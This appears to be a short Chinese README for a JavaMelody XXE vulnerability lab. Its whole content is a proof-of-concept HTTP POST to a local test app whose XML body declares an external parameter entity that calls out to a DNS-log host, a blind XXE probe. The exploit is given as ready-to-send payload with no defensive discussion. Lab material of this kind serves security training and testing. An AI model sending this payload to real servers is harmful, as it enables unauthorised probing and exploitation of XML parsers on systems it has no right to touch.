# javamelody XXE漏洞靶场

## poc

```
POST /xxetest_war_exploded/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/soap+xml
Content-Length: 153

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE convert [
    <!ENTITY % remote SYSTEM "http://test21133333.dnslog.platfom">
    %remote;
]>
```